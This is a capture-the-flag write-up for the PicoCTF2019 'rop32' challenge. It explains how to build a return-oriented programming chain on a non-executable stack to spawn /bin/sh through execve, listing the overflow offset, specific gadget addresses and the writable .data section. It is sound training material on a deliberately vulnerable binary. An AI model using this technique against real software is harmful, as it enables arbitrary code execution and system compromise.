# PicoCTF2019 Rop32

1) Setup
segfault after 28 bytes.
> readelf -l vuln
[...]
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
[...]

Stack not executable (missing "X" flag).
Their no way to execute a shellcode -> ROP

2) Syscall gadget
> ROPgadget --binary vuln > gadgets.rop
The goal is to launch a shell with the following syscall: 'sys_execve("/bin/sh", NULL, NULL)'

In order to perform a syscall, eax must be set to the corresponding syscall number, defined in unistd_32.h, before the int 0x80 call:
> cat /usr/include/asm/unistd_32.h  | grep execv 
> #define __NR_execve 11

In our case, it's going to be 11. We need to find a gadget that set eax to zero, and another one that increment eax.
That way, we can manually set eax = 11.

From our gadget.rop file:
> "0x08056420 : xor eax, eax ; ret"
> "0x0807c2fa : inc eax ; ret"
We found the perfects gadgets !

Next, we need to be able to set the second and third argument to "NULL".
We'll push the "0" value on the stack, and with the help of a "pop" gadget, thoses values will be respectively load into ECX (second arg) and EDX (third arg):
> "0x0806ee92 : pop ecx ; pop ebx ; ret"
Two birds with one stone :)

Next, the int 0x80 must be located, in order to tell the OS that we want to perform a syscall:
> "0x0806f79f : nop ; int 0x80"

Finally, we need to be able to pass the "/bin/sh" string as the first argument of the the execve call.
Those gadgets make us write arbitrary data in memory:
> "0x0806ee6b : pop edx ; ret"
> "0x080a8e36 : pop eax ; ret"
> "0x08056e65 : mov dword ptr [edx], eax ; ret"

But where to write the "/bin/sh" string since the Stack is not executable ?
> readelf -S vuln
[...]
[20] .data             PROGBITS        080da060 091060 000f20 00  WA  0   0 32
[...]

> "0x080481c9 : pop ebx ; ret"

In the .data section! It have the "W" (write) flag.

See exploit.py (read it backward!)
